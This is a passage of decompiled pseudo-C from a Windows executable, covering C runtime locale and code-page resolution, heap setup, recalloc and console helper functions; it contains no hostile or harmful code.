    if ( sub_14001D3D0(a1, *((_DWORD *)v3 + 6) != 0 ? 3 : 4097, v16, 0x40u) == 0 )
      goto LABEL_2;
    v6 = sub_140022B50(*v3, (__int64)v16);
    v7 = *((_DWORD *)v3 + 4);
    if ( v6 != 0 )
    {
      if ( (v7 & 2) != 0 )
        goto LABEL_20;
      if ( *((_DWORD *)v3 + 5) == 0 || (unsigned int)sub_1400280C0(*v3, v16, *((int *)v3 + 5)) != 0 )
      {
        if ( (v3[2] & 1) != 0 || (unsigned int)TestDefaultCountry(a1) == 0 )
          goto LABEL_20;
        *((_DWORD *)v3 + 4) |= 1u;
        v8 = -1;
        do
          ++v8;
        while ( *(_WORD *)(a1 + 2 * v8) != 0 );
      }
      else
      {
        *((_DWORD *)v3 + 4) |= 2u;
        v8 = -1;
        do
          ++v8;
        while ( *(_WORD *)(a1 + 2 * v8) != 0 );
      }
    }
    else
    {
      v8 = -1;
      *((_DWORD *)v3 + 4) = v7 | 0x304;
      do
        ++v8;
      while ( *(_WORD *)(a1 + 2 * v8) != 0 );
    }
    if ( (unsigned int)sub_140022E30((_WORD *)v3 + 300, 85, a1, v8 + 1) != 0 )
      goto LABEL_46;
  }
LABEL_20:
  if ( (v3[2] & 0x300) == 0x300 )
    return (v3[2] & 4) == 0;
  if ( sub_14001D3D0(a1, *((_DWORD *)v3 + 6) != 0 ? 3 : 4097, v16, 0x40u) == 0 )
  {
LABEL_2:
    *((_DWORD *)v3 + 4) = 0;
    return 1;
  }
  if ( (unsigned int)sub_140022B50(*v3, (__int64)v16) == 0 )
  {
    v9 = *((_DWORD *)v3 + 4) | 0x200;
    *((_DWORD *)v3 + 4) = v9;
    if ( *((_DWORD *)v3 + 6) == 0 )
    {
      if ( *((_DWORD *)v3 + 5) == 0 )
        goto LABEL_43;
      v11 = -1;
      do
        ++v11;
      while ( *(_WORD *)(*v3 + 2 * v11) != 0 );
      if ( (_DWORD)v11 == *((_DWORD *)v3 + 5) )
      {
        if ( (unsigned int)TestDefaultCountry(a1) == 0 )
        {
          v12 = (__int16 *)*v3;
          v13 = 0;
          if ( *v3 != 0 )
          {
            while ( 1 )
            {
              v14 = *v12++;
              if ( (unsigned __int16)(v14 - 65) > 0x19u && (unsigned __int16)(v14 - 97) > 0x19u )
                break;
              ++v13;
            }
          }
          v15 = -1;
          do
            ++v15;
          while ( *(_WORD *)(*v3 + 2 * v15) != 0 );
          if ( v13 == (_DWORD)v15 )
            return (v3[2] & 4) == 0;
        }
        *((_DWORD *)v3 + 4) |= 0x100u;
        v10 = v3 + 75;
        if ( *((_WORD *)v3 + 300) != 0 )
          return (v3[2] & 4) == 0;
        do
          ++v5;
        while ( *(_WORD *)(a1 + 2 * v5) != 0 );
      }
      else
      {
LABEL_43:
        v10 = v3 + 75;
        *((_DWORD *)v3 + 4) = v9 | 0x100;
        if ( *((_WORD *)v3 + 300) != 0 )
          return (v3[2] & 4) == 0;
        do
          ++v5;
        while ( *(_WORD *)(a1 + 2 * v5) != 0 );
      }
LABEL_41:
      if ( (unsigned int)sub_140022E30(v10, 85, a1, v5 + 1) == 0 )
        return (v3[2] & 4) == 0;
LABEL_46:
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    }
    v10 = v3 + 75;
    *((_DWORD *)v3 + 4) = v9 | 0x100;
    if ( *((_WORD *)v3 + 300) == 0 )
    {
      do
        ++v5;
      while ( *(_WORD *)(a1 + 2 * v5) != 0 );
      goto LABEL_41;
    }
  }
  return (v3[2] & 4) == 0;
}


// ----- LanguageEnumProcEx @ 0x140026a28 -----
_BOOL8 __fastcall LanguageEnumProcEx(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  __int64 v5; // r9
  WCHAR v6[120]; // [rsp+30h] [rbp-108h] BYREF

  v2 = sub_14001C7D8();
  v3 = v2 + 152;
  if ( sub_14001D3D0(a1, *(_DWORD *)(v2 + 176) != 0 ? 3 : 4097, v6, 0x78u) != 0 )
  {
    if ( (unsigned int)sub_140022B50(*(_QWORD *)v3, (__int64)v6) == 0 )
    {
      v5 = -1;
      do
        ++v5;
      while ( *(_WORD *)(a1 + 2 * v5) != 0 );
      if ( (unsigned int)sub_140022E30((_WORD *)(v3 + 600), 85, a1, v5 + 1) != 0 )
        invoke_watson(nullptr, nullptr, nullptr, 0, 0);
      *(_DWORD *)(v3 + 16) |= 4u;
    }
    return (*(_DWORD *)(v3 + 16) & 4) == 0;
  }
  else
  {
    *(_DWORD *)(v3 + 16) = 0;
    return true;
  }
}


// ----- sub_140026B14 @ 0x140026b14 -----
int __fastcall sub_140026B14(wint_t *a1, __int64 a2)
{
  LCTYPE v4; // edx
  int result; // eax
  int v6; // [rsp+30h] [rbp+8h] BYREF

  v6 = 0;
  if ( a1 != nullptr && *a1 != 0 && (unsigned int)sub_140029D90(a1, L"ACP") != 0 )
  {
    if ( (unsigned int)sub_140022B50((__int64)a1, (__int64)L"utf8") == 0
      || (unsigned int)sub_140022B50((__int64)a1, (__int64)L"utf-8") == 0 )
    {
      return 65001;
    }
    if ( (unsigned int)sub_140029D90(a1, L"OCP") != 0 )
      return unknown_libname_84(a1);
    v4 = 536870923;
  }
  else
  {
    v4 = 536875012;
  }
  result = sub_14001D3D0(a2 + 600, v4, (WCHAR *)&v6, 2u);
  if ( result != 0 )
  {
    result = v6;
    if ( v6 < 3 )
      return 65001;
  }
  return result;
}


// ----- TestDefaultCountry @ 0x140026bd4 -----
__int64 __fastcall TestDefaultCountry(_WORD *a1)
{
  unsigned int v2; // ebx
  WCHAR v4[12]; // [rsp+20h] [rbp-28h] BYREF

  v2 = 0;
  if ( sub_14001D3D0((__int64)a1, 0x59u, v4, 9u) == 0 )
    return 0;
  LOBYTE(v2) = (unsigned int)sub_140026080(v4, a1, 9) == 0;
  return v2;
}


// ----- TranslateName @ 0x140026c40 -----
__int64 __fastcall TranslateName(__int64 a1, int a2, __int64 *a3)
{
  unsigned int v3; // ebx
  int v5; // edi
  int v7; // eax
  int v8; // esi
  bool v9; // zf
  __int64 v10; // rbp

  v3 = 0;
  v5 = a2;
  v7 = 1;
  v8 = 0;
  if ( a2 < 0 )
  {
LABEL_9:
    v9 = v7 == 0;
  }
  else
  {
    while ( 1 )
    {
      v9 = v7 == 0;
      if ( v7 == 0 )
        break;
      v10 = (v8 + v5) / 2;
      v7 = sub_140022B50(*a3, *(_QWORD *)(16 * v10 + a1));
      if ( v7 != 0 )
      {
        if ( v7 >= 0 )
          v8 = v10 + 1;
        else
          v5 = v10 - 1;
      }
      else
      {
        *a3 = 16 * v10 + a1 + 8;
      }
      if ( v8 > v5 )
        goto LABEL_9;
    }
  }
  LOBYTE(v3) = v9;
  return v3;
}


// ----- sub_140026CDC @ 0x140026cdc -----
__int64 __fastcall sub_140026CDC(_WORD *a1, int *a2, WCHAR *a3)
{
  __int64 v6; // rax
  __int64 v7; // rbp
  __int64 *v8; // rbx
  __int64 v9; // r12
  _WORD **v10; // rsi
  UINT ACP; // eax
  int v12; // ebx
  __int64 v13; // r9

  v6 = sub_14001C7D8();
  v7 = v6;
  v8 = (__int64 *)(v6 + 152);
  *(_DWORD *)(v6 + 168) = 0;
  v9 = v6 + 752;
  *(_QWORD *)(v6 + 152) = a1;
  v10 = (_WORD **)(v6 + 160);
  *(_WORD *)(v6 + 752) = 0;
  *(_QWORD *)(v6 + 160) = a1 + 64;
  if ( a1[64] != 0 )
    TranslateName((__int64)&off_140093060, 22, (__int64 *)(v6 + 160));
  if ( *(_WORD *)*v8 == 0 )
  {
    GetLocaleNameFromDefault((__int64)v8);
    goto LABEL_13;
  }
  if ( **v10 != 0 )
    GetLocaleNameFromLangCountry((__int64)v8);
  else
    GetLocaleNameFromLanguage((__int64)v8);
  if ( *(_DWORD *)(v7 + 168) == 0 )
  {
    if ( (unsigned int)TranslateName((__int64)&off_140092C40, 64, v8) != 0 )
    {
      if ( **v10 != 0 )
        GetLocaleNameFromLangCountry((__int64)v8);
      else
        GetLocaleNameFromLanguage((__int64)v8);
    }
LABEL_13:
    if ( *(_DWORD *)(v7 + 168) == 0 )
      return 0;
  }
  if ( a1 == nullptr || *a1 != 0 || a1[128] != 0 )
    ACP = sub_140026B14((wint_t *)((unsigned __int64)(a1 + 128) & -(__int64)(a1 != nullptr)), (__int64)v8);
  else
    ACP = GetACP();
  v12 = ACP;
  if ( ACP != 0 && ACP != 65000 && IsValidCodePage((unsigned __int16)ACP) )
  {
    if ( a2 != nullptr )
      *a2 = v12;
    if ( a3 == nullptr )
      return 1;
    v13 = -1;
    a3[144] = 0;
    do
      ++v13;
    while ( *(_WORD *)(v9 + 2 * v13) != 0 );
    if ( (unsigned int)sub_140022E30(a3 + 144, 85, v9, v13 + 1) != 0 )
      goto LABEL_38;
    if ( sub_14001D3D0((__int64)(a3 + 144), 0x1001u, a3, 0x40u) != 0
      && sub_14001D3D0((__int64)(a3 + 144), 0x1002u, a3 + 64, 0x40u) != 0
      && (sub_14002A93C(a3 + 64, 95) == 0 && sub_14002A93C(a3 + 64, 46) == 0
       || sub_14001D3D0((__int64)(a3 + 144), 7u, a3 + 64, 0x40u) != 0) )
    {
      if ( v12 != 65001 )
      {
        itow_s(v12, a3 + 128, 0x10u, 10);
        return 1;
      }
      if ( (unsigned int)sub_140022E30(a3 + 128, 16, (__int64)L"utf8", 5) == 0 )
        return 1;
LABEL_38:
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    }
  }
  return 0;
}


// ----- CountryEnumProc @ 0x140026f58 -----
__int64 __fastcall CountryEnumProc(LPWSTR a1)
{
  __int64 v2; // rbp
  _DWORD *v3; // rdi
  LCID v4; // esi
  int v5; // ebx
  _WORD *i; // rax
  WCHAR LCData[120]; // [rsp+20h] [rbp-108h] BYREF

  v2 = sub_14001C7D8();
  v3 = *(_DWORD **)(sub_14001C7D8() + 928);
  v4 = LcidFromHexString(a1);
  v5 = 0;
  if ( GetLocaleInfoW(v4, *(_DWORD *)(v2 + 180) != 0 ? 7 : 4098, LCData, 120) != 0 )
  {
    if ( (unsigned int)sub_140022B50(*(_QWORD *)(v2 + 160), (__int64)LCData) == 0 )
    {
      for ( i = &unk_140093C18; (_WORD)v4 != *i; ++i )
      {
        if ( (unsigned int)++v5 >= 0xA )
        {
          *v3 |= 4u;
          v3[2] = v4;
          v3[1] = v4;
          return (*v3 & 4) == 0;
        }
      }
    }
    return (*v3 & 4) == 0;
  }
  else
  {
    *v3 = 0;
    return 1;
  }
}


// ----- GetLcidFromLangCountry @ 0x140027040 -----
bool __fastcall GetLcidFromLangCountry(_DWORD *a1)
{
  __int64 v2; // rax
  __int64 v3; // r8
  __int64 v4; // r9
  __int64 v5; // rdx
  __int64 v6; // rax
  bool v7; // zf
  int v8; // r8d
  __int16 *v9; // rcx
  int i; // r10d
  __int16 v11; // r9
  bool result; // al

  v2 = sub_14001C7D8();
  v3 = -1;
  v4 = -1;
  v5 = v2 + 152;
  v6 = *(_QWORD *)(v2 + 152);
  do
    ++v4;
  while ( *(_WORD *)(v6 + 2 * v4) != 0 );
  *(_DWORD *)(v5 + 24) = v4 == 3;
  do
    ++v3;
  while ( *(_WORD *)(*(_QWORD *)(v5 + 8) + 2 * v3) != 0 );
  v7 = v3 == 3;
  v8 = 2;
  *(_DWORD *)(v5 + 28) = v7;
  a1[1] = 0;
  if ( *(_DWORD *)(v5 + 24) == 0 )
  {
    v9 = *(__int16 **)v5;
    for ( i = 0; ; ++i )
    {
      v11 = *v9++;
      if ( (unsigned __int16)(v11 - 65) > 0x19u && (unsigned __int16)(v11 - 97) > 0x19u )
        break;
    }
    v8 = i;
  }
  *(_DWORD *)(v5 + 20) = v8;
  EnumSystemLocalesW(sub_1400271A8, 1u);
  result = (*a1 & 0x100) != 0;
  if ( (*a1 & 0x200) == 0 || (*a1 & 7) == 0 || !result )
    *a1 = 0;
  return result;
}


// ----- GetLcidFromLanguage @ 0x140027110 -----
BOOL __fastcall GetLcidFromLanguage(_DWORD *a1)
{
  __int64 v2; // rax
  __int64 v3; // r8
  __int16 *v4; // rdx
  int v5; // ecx
  int i; // r9d
  __int16 v7; // r8
  BOOL result; // eax

  v2 = sub_14001C7D8();
  v3 = -1;
  v4 = *(__int16 **)(v2 + 152);
  do
    ++v3;
  while ( v4[v3] != 0 );
  v5 = 2;
  *(_DWORD *)(v2 + 176) = v3 == 3;
  if ( v3 != 3 )
  {
    for ( i = 0; ; ++i )
    {
      v7 = *v4++;
      if ( (unsigned __int16)(v7 - 65) > 0x19u && (unsigned __int16)(v7 - 97) > 0x19u )
        break;
    }
    v5 = i;
  }
  *(_DWORD *)(v2 + 172) = v5;
  result = EnumSystemLocalesW(LanguageEnumProc, 1u);
  if ( (*(_BYTE *)a1 & 4) == 0 )
    *a1 = 0;
  return result;
}


// ----- sub_1400271A8 @ 0x1400271a8 -----
__int64 __fastcall sub_1400271A8(LPWSTR a1)
{
  _QWORD *v2; // rsi
  int *v3; // rdi
  LCID v4; // ebx
  __int64 v5; // rbp
  int v6; // eax
  int v7; // ecx
  __int64 v8; // rax
  unsigned int v9; // ecx
  _WORD *v10; // rax
  int v11; // eax
  __int64 v12; // rdx
  WCHAR LCData[120]; // [rsp+20h] [rbp-118h] BYREF

  v2 = (_QWORD *)(sub_14001C7D8() + 152);
  v3 = *(int **)(sub_14001C7D8() + 928);
  v4 = LcidFromHexString(a1);
  if ( GetLocaleInfoW(v4, *((_DWORD *)v2 + 7) != 0 ? 7 : 4098, LCData, 120) == 0 )
    goto LABEL_37;
  v5 = -1;
  if ( (unsigned int)sub_140022B50(v2[1], (__int64)LCData) == 0 )
  {
    if ( GetLocaleInfoW(v4, *((_DWORD *)v2 + 6) != 0 ? 3 : 4097, LCData, 120) == 0 )
      goto LABEL_37;
    v6 = sub_140022B50(*v2, (__int64)LCData);
    v7 = *v3;
    if ( v6 != 0 )
    {
      if ( (v7 & 2) == 0 )
      {
        if ( *((_DWORD *)v2 + 5) == 0 || (unsigned int)sub_1400280C0(*v2, LCData, *((int *)v2 + 5)) != 0 )
        {
          if ( (*(_BYTE *)v3 & 1) == 0 )
          {
            v9 = 0;
            v10 = &unk_140093C18;
            while ( (_WORD)v4 != *v10 )
            {
              ++v9;
              ++v10;
              if ( v9 >= 0xA )
              {
                *v3 |= 1u;
                goto LABEL_18;
              }
            }
          }
        }
        else
        {
          *v3 |= 2u;
          v8 = -1;
          v3[2] = v4;
          do
            ++v8;
          while ( *(_WORD *)(*v2 + 2 * v8) != 0 );
          if ( (_DWORD)v8 == *((_DWORD *)v2 + 5) )
            v3[1] = v4;
        }
      }
    }
    else
    {
      v3[1] = v4;
      *v3 = v7 | 0x304;
LABEL_18:
      v3[2] = v4;
    }
  }
  if ( (*v3 & 0x300) == 0x300 )
    return (*v3 & 4) == 0;
  if ( GetLocaleInfoW(v4, *((_DWORD *)v2 + 6) != 0 ? 3 : 4097, LCData, 120) != 0 )
  {
    if ( (unsigned int)sub_140022B50(*v2, (__int64)LCData) != 0 )
    {
      if ( *((_DWORD *)v2 + 6) != 0
        || *((_DWORD *)v2 + 5) == 0
        || (unsigned int)sub_140022B50(*v2, (__int64)LCData) != 0 )
      {
        return (*v3 & 4) == 0;
      }
      v12 = 0;
    }
    else
    {
      v11 = *v3 | 0x200;
      *v3 = v11;
      if ( *((_DWORD *)v2 + 6) != 0 || *((_DWORD *)v2 + 5) == 0 )
        goto LABEL_23;
      do
        ++v5;
      while ( *(_WORD *)(*v2 + 2 * v5) != 0 );
      if ( (_DWORD)v5 != *((_DWORD *)v2 + 5) )
      {
LABEL_23:
        *v3 = v11 | 0x100;
        goto LABEL_34;
      }
      v12 = 1;
    }
    if ( (unsigned int)sub_1400275F8(v4, v12, v3) != 0 )
    {
      *v3 |= 0x100u;
LABEL_34:
      if ( v3[1] == 0 )
        v3[1] = v4;
    }
    return (*v3 & 4) == 0;
  }
LABEL_37:
  *v3 = 0;
  return 1;
}


// ----- LanguageEnumProc @ 0x1400273ec -----
__int64 __fastcall LanguageEnumProc(LPWSTR a1)
{
  __int64 v2; // rsi
  _DWORD *v3; // rdi
  LCID v4; // ebx
  int v6; // eax
  int v7; // ecx
  __int64 v8; // rdx
  WCHAR LCData[120]; // [rsp+20h] [rbp-108h] BYREF

  v2 = sub_14001C7D8();
  v3 = *(_DWORD **)(sub_14001C7D8() + 928);
  v4 = LcidFromHexString(a1);
  if ( GetLocaleInfoW(v4, *(_DWORD *)(v2 + 176) != 0 ? 3 : 4097, LCData, 120) == 0 )
  {
    *v3 = 0;
    return 1;
  }
  v6 = sub_140022B50(*(_QWORD *)(v2 + 152), (__int64)LCData);
  v7 = *(_DWORD *)(v2 + 176);
  if ( v6 != 0 )
  {
    if ( v7 != 0
      || *(_DWORD *)(v2 + 172) == 0
      || (unsigned int)sub_140022B50(*(_QWORD *)(v2 + 152), (__int64)LCData) != 0 )
    {
      return (*v3 & 4) == 0;
    }
    v8 = 0;
  }
  else
  {
    if ( v7 != 0 )
    {
LABEL_11:
      *v3 |= 4u;
      v3[1] = v4;
      v3[2] = v4;
      return (*v3 & 4) == 0;
    }
    v8 = 1;
  }
  if ( (unsigned int)sub_1400275F8(v4, v8, v3) != 0 )
    goto LABEL_11;
  return (*v3 & 4) == 0;
}


// ----- LcidFromHexString @ 0x1400274f4 -----
__int64 __fastcall LcidFromHexString(unsigned __int16 *a1)
{
  unsigned __int16 v1; // dx
  unsigned __int16 *v2; // r8
  unsigned int v3; // r9d
  __int16 v4; // ax
  int v5; // ecx

  v1 = *a1;
  v2 = a1 + 1;
  v3 = 0;
  while ( v1 != 0 )
  {
    if ( (unsigned __int16)(v1 - 97) > 5u )
    {
      if ( (unsigned __int16)(v1 - 65) > 5u )
        goto LABEL_7;
      v4 = -7;
    }
    else
    {
      v4 = -39;
    }
    v1 += v4;
LABEL_7:
    v5 = v1;
    v1 = *v2;
    v3 = v5 + 16 * v3 - 48;
    ++v2;
  }
  return v3;
}


// ----- sub_140027544 @ 0x140027544 -----
UINT __fastcall sub_140027544(wint_t *a1, __int64 a2)
{
  UINT result; // eax
  UINT LCData; // [rsp+30h] [rbp+8h] BYREF

  LCData = 0;
  if ( a1 != nullptr && *a1 != 0 && (unsigned int)sub_140029D90(a1, L"ACP") != 0 )
  {
    if ( (unsigned int)sub_140029D90(a1, L"OCP") != 0 )
      return unknown_libname_84(a1);
    if ( GetLocaleInfoW(*(_DWORD *)(a2 + 8), 0x2000000Bu, (LPWSTR)&LCData, 2) != 0 )
      return LCData;
  }
  else if ( GetLocaleInfoW(*(_DWORD *)(a2 + 8), 0x20001004u, (LPWSTR)&LCData, 2) != 0 )
  {
    result = LCData;
    if ( LCData == 0 )
      return GetACP();
    return result;
  }
  return 0;
}


// ----- sub_1400275F8 @ 0x1400275f8 -----
__int64 __fastcall sub_1400275F8(int a1, int a2)
{
  unsigned int v2; // ebx
  __int64 v5; // rsi
  __int16 *v6; // r9
  int v7; // r8d
  __int16 v8; // dx
  __int16 *v9; // rcx
  __int64 v10; // rax
  int LCData; // [rsp+30h] [rbp+8h] BYREF

  v2 = 0;
  LCData = 0;
  v5 = sub_14001C7D8();
  if ( GetLocaleInfoW(a1 & 0x3FF | 0x400, 0x20000001u, (LPWSTR)&LCData, 2) == 0 )
    return 0;
  if ( a1 == LCData || a2 == 0 )
    return 1;
  v6 = *(__int16 **)(v5 + 152);
  v7 = 0;
  v8 = *v6;
  v9 = v6 + 1;
  while ( (unsigned __int16)(v8 - 65) <= 0x19u || (unsigned __int16)(v8 - 97) <= 0x19u )
  {
    v8 = *v9;
    ++v7;
    ++v9;
  }
  v10 = -1;
  do
    ++v10;
  while ( v6[v10] != 0 );
  LOBYTE(v2) = v7 != (_DWORD)v10;
  return v2;
}


// ----- sub_1400276B4 @ 0x1400276b4 -----
char __fastcall sub_1400276B4(__int64 a1, int a2, __int64 *a3)
{
  int v3; // esi
  int v5; // ebx
  __int64 v7; // r15
  int v8; // eax
  int v9; // ecx

  v3 = 0;
  v5 = a2;
  if ( a2 < 0 )
    return 0;
  while ( 1 )
  {
    v7 = (v3 + v5) / 2;
    v8 = sub_140022B50(*a3, *(_QWORD *)(16 * v7 + a1));
    if ( v8 == 0 )
      break;
    v9 = v7 - 1;
    if ( v8 >= 0 )
      v9 = v5;
    v5 = v9;
    if ( v8 >= 0 )
      v3 = v7 + 1;
    if ( v3 > v9 )
      return 0;
  }
  *a3 = 16 * v7 + a1 + 8;
  return 1;
}


// ----- sub_14002773C @ 0x14002773c -----
__int64 __fastcall sub_14002773C(__int64 a1, int *a2, WCHAR *a3)
{
  __int64 v6; // rsi
  _QWORD *v7; // rbx
  _WORD *v8; // rax
  __int64 v9; // rdx
  __int64 v10; // rcx
  UINT v11; // eax
  int v12; // ebx
  LCID Locale[2]; // [rsp+20h] [rbp-20h] BYREF
  LCID UserDefaultLCID; // [rsp+28h] [rbp-18h]

  v6 = sub_14001C7D8();
  *(_QWORD *)Locale = 0;
  UserDefaultLCID = 0;
  v7 = (_QWORD *)(v6 + 160);
  *(_QWORD *)(sub_14001C7D8() + 928) = Locale;
  *(_QWORD *)(v6 + 152) = a1;
  *(_QWORD *)(v6 + 160) = a1 + 128;
  if ( a1 != -128 && *(_WORD *)(a1 + 128) != 0 )
    sub_1400276B4((__int64)&off_140093060, 22, (__int64 *)(v6 + 160));
  Locale[0] = 0;
  v8 = *(_WORD **)(v6 + 152);
  if ( v8 == nullptr || *v8 == 0 )
  {
    if ( *v7 != 0 && *(_WORD *)*v7 != 0 )
    {
      v9 = sub_14001C7D8();
      v10 = -1;
      do
        ++v10;
      while ( *(_WORD *)(*(_QWORD *)(v9 + 160) + 2 * v10) != 0 );
      *(_DWORD *)(v9 + 180) = v10 == 3;
      EnumSystemLocalesW((LOCALE_ENUMPROCW)CountryEnumProc, 1u);
      if ( (Locale[0] & 4) == 0 )
        Locale[0] = 0;
    }
    else
    {
      Locale[0] = 260;
      UserDefaultLCID = GetUserDefaultLCID();
      Locale[1] = UserDefaultLCID;
    }
LABEL_23:
    if ( Locale[0] == 0 )
      return 0;
    goto LABEL_24;
  }
  if ( *v7 != 0 && *(_WORD *)*v7 != 0 )
    GetLcidFromLangCountry(Locale);
  else
    GetLcidFromLanguage(Locale);
  if ( Locale[0] == 0 )
  {
    if ( sub_1400276B4((__int64)&off_140092C40, 64, (__int64 *)(v6 + 152)) != 0 )
    {
      if ( *v7 != 0 && *(_WORD *)*v7 != 0 )
        GetLcidFromLangCountry(Locale);
      else
        GetLcidFromLanguage(Locale);
    }
    goto LABEL_23;
  }
LABEL_24:
  v11 = sub_140027544((wint_t *)((a1 + 256) & -(__int64)(a1 != 0)), (__int64)Locale);
  v12 = v11;
  if ( v11 != 0 && IsValidCodePage((unsigned __int16)v11) && IsValidLocale(Locale[1], 1u) )
  {
    if ( a2 != nullptr )
      *a2 = v12;
    sub_14001D544(Locale[1], v6 + 752, 0x55u, 0);
    if ( a3 == nullptr )
      return 1;
    sub_14001D544(Locale[1], (__int64)(a3 + 144), 0x55u, 0);
    if ( GetLocaleInfoW(Locale[1], 0x1001u, a3, 64) != 0 && GetLocaleInfoW(UserDefaultLCID, 0x1002u, a3 + 64, 64) != 0 )
    {
      itow_s(v12, a3 + 128, 0x10u, 10);
      return 1;
    }
  }
  return 0;
}


// ----- _recalloc_base @ 0x1400279c0 -----
void *__cdecl recalloc_base(void *Block, size_t Count, size_t Size)
{
  size_t v7; // rdi
  size_t v8; // rbx
  char *v9; // rax
  void *v10; // rsi

  if ( Count != 0 && 0xFFFFFFFFFFFFFFE0uLL / Count < Size )
  {
    *(_DWORD *)sub_140018888() = 12;
    return nullptr;
  }
  else
  {
    if ( Block != nullptr )
      v7 = msize(Block);
    else
      v7 = 0;
    v8 = Size * Count;
    v9 = (char *)realloc_base(Block, v8);
    v10 = v9;
    if ( v9 != nullptr && v7 < v8 )
      memset(&v9[v7], 0, v8 - v7);
    return v10;
  }
}


// ----- j__recalloc_base @ 0x140027a60 -----
// attributes: thunk
void *__cdecl j__recalloc_base(void *Block, size_t Count, size_t Size)
{
  return recalloc_base(Block, Count, Size);
}


// ----- sub_140027A70 @ 0x140027a70 -----
HANDLE sub_140027A70()
{
  return hHeap;
}


// ----- __acrt_initialize_heap @ 0x140027a80 -----
bool _acrt_initialize_heap()
{
  hHeap = GetProcessHeap();
  return hHeap != nullptr;
}


// ----- sub_140027AB0 @ 0x140027ab0 -----
char sub_140027AB0()
{
  hHeap = nullptr;
  return 1;
}


// ----- sub_140027AD0 @ 0x140027ad0 -----
HANDLE sub_140027AD0()
{
  return hHeap;
}


// ----- sub_140027AD8 @ 0x140027ad8 -----
char __fastcall sub_140027AD8(unsigned __int8 (**a1)(void), unsigned __int8 (**a2)(void))
{
  unsigned __int8 (**v4)(void); // rbx
  unsigned __int8 (**v5)(void); // rbx

  if ( a1 == a2 )
    return 1;
  v4 = a1;
  do
  {
    if ( *v4 != nullptr && (*v4)() == 0 )
      break;
    v4 += 2;
  }
  while ( v4 != a2 );
  if ( v4 == a2 )
    return 1;
  if ( v4 != a1 )
  {
    v5 = v4 - 1;
    do
    {
      if ( *(v5 - 1) != nullptr && *v5 != nullptr )
        ((void (__fastcall *)(_QWORD))*v5)(0);
      v5 -= 2;
    }
    while ( v5 + 1 != a1 );
  }
  return 0;
}


// ----- sub_140027B58 @ 0x140027b58 -----
char __fastcall sub_140027B58(__int64 a1, __int64 a2)
{
  __int64 i; // rbx
  void (__fastcall *v4)(_QWORD); // rax

  for ( i = a2; i != a1; i -= 16 )
  {
    v4 = *(void (__fastcall **)(_QWORD))(i - 8);
    if ( v4 != nullptr )
      v4(0);
  }
  return 1;
}


// ----- __acrt_DownlevelLCIDToLocaleName @ 0x140027b94 -----
__int64 __fastcall _acrt_DownlevelLCIDToLocaleName(int a1, _WORD *a2, int a3)
{
  __int64 v3; // rdi
  int v6; // r9d
  int v7; // r10d
  int v8; // eax
  __int64 v9; // rcx
  int v10; // edx
  int v11; // ecx
  int v12; // eax
  _WORD *v14; // rbp
  int v15; // eax
  int v16; // ebx

  v3 = a3;
  if ( (a1 & 0xFFFFF3FF) == 0 && a1 != 3072 || a2 == nullptr && (int)v3 > 0 || (int)v3 < 0 )
    return 0;
  v6 = 0;
  v7 = 227;
  while ( 1 )
  {
    v8 = (v7 + v6) / 2;
    v9 = 4LL * v8;
    v10 = a1 - dword_140093C30[v9];
    if ( a1 == dword_140093C30[v9] )
      break;
    v11 = v8 - 1;
    if ( v10 >= 0 )
      v11 = v7;
    v12 = v8 + 1;
    v7 = v11;
    if ( v10 >= 0 )
      v6 = v12;
    if ( v6 > v11 )
      return 0;
  }
  if ( v8 < 0 )
    return 0;
  v14 = *(_WORD **)&dword_140093C30[4 * v8 + 2];
  v15 = sub_140017760(v14, 0x55u);
  v16 = v15;
  if ( (int)v3 > 0 )
  {
    if ( v15 < (int)v3 )
    {
      if ( (unsigned int)sub_140021B30(a2, v3, (__int64)v14) != 0 )
        invoke_watson(nullptr, nullptr, nullptr, 0, 0);
      return (unsigned int)(v16 + 1);
    }
    return 0;
  }
  return (unsigned int)(v16 + 1);
}


// ----- sub_140027C7C @ 0x140027c7c -----
__int64 __fastcall sub_140027C7C(__int64 a1)
{
  int v2; // ebx
  int v3; // esi
  __int64 v4; // rbp
  int v5; // eax
  int v6; // ecx
  unsigned __int64 v8; // rax

  if ( a1 == 0 )
    return 0;
  v2 = 0;
  v3 = 227;
  while ( 1 )
  {
    v4 = (v3 + v2) / 2;
    v5 = sub_140028050(a1, *(&off_140095680 + 2 * v4), 85);
    if ( v5 == 0 )
      break;
    v6 = v4 - 1;
    if ( v5 >= 0 )
      v6 = v3;
    v3 = v6;
    if ( v5 >= 0 )
      v2 = v4 + 1;
    if ( v2 > v6 )
      return 0;
  }
  v8 = dword_140095688[4 * v4];
  if ( (v8 & 0x80000000) == 0LL && v8 < 0xE4 )
    return (unsigned int)dword_140093C30[4 * v8];
  else
    return 0;
}


// ----- _isatty @ 0x140027d24 -----
int __cdecl isatty(int FileHandle)
{
  if ( FileHandle == -2 )
  {
    *(_DWORD *)sub_140018888() = 9;
  }
  else
  {
    if ( FileHandle >= 0 && FileHandle < (unsigned int)dword_1400A0A80 )
      return *(_BYTE *)(qword_1400A0680[(unsigned __int64)FileHandle >> 6] + 72LL * (FileHandle & 0x3F) + 56) & 0x40;
    *(_DWORD *)sub_140018888() = 9;
    invalid_parameter_noinfo();
  }
  return 0;
}


// ----- sub_140027D84 @ 0x140027d84 -----
__int64 __fastcall sub_140027D84(unsigned __int16 a1)
{
  unsigned __int16 Buffer; // [rsp+30h] [rbp+8h] BYREF
  DWORD NumberOfCharsWritten; // [rsp+38h] [rbp+10h] BYREF

  Buffer = a1;
  if ( (unsigned int)_dcrt_lowio_ensure_console_output_initialized() != 0
    && (NumberOfCharsWritten = 0, (unsigned int)unknown_libname_87(&Buffer, 1u, &NumberOfCharsWritten) != 0) )
  {
    return Buffer;
  }
  else
  {
    return 0xFFFF;
  }
}


// ----- sub_140027DC4 @ 0x140027dc4 -----
__int64 __fastcall sub_140027DC4(
        __crt_mbstring *this,
        unsigned __int16 **a2,
        unsigned __int64 a3,
        struct __crt_cached_ptd_host *a4,
        struct _Mbstatet *a5)
{
  struct _Mbstatet *v5; // rax
  struct __crt_cached_ptd_host *v6; // rsi
  unsigned __int16 *v7; // rdi
  __crt_mbstring *v11; // rbx
  unsigned __int16 *v12; // rbp
  __crt_mbstring *v13; // r13
  size_t v14; // rax
  size_t v15; // rsi
  __int64 result; // rax
  __int64 v17; // rbx
  struct __crt_cached_ptd_host *v18; // [rsp+28h] [rbp-50h]
  char v19[8]; // [rsp+30h] [rbp-48h] BYREF

  v5 = a5;
  v6 = a4;
  v7 = *a2;
  v18 = a4;
